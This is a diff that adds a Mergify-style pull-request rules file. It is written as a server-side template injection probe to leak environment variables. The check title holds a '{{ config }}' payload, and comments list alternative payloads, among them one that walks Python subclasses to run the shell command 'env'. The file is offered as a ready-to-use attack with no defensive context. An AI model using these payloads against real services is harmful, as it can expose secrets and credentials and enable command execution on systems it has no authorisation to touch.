@@ -1,0 +1,13 @@
+# SSTI - Environment Variable Leak
+pull_request_rules:
+  - name: ssti-env
+    conditions: []
+    actions:
+      post_check:
+        title: "env:{{ config }}"
+        summary: "config dump"
+
+# Alternative probes (rename file to .mergify.yml for each):
+# title: "{{ request.environ }}"
+# title: "{{ self.__init__.__globals__ }}"
+# title: "{{ ''.__class__.__mro__[1].__subclasses__()[X]('env',shell=True,stdout=-1).communicate()[0] }}"
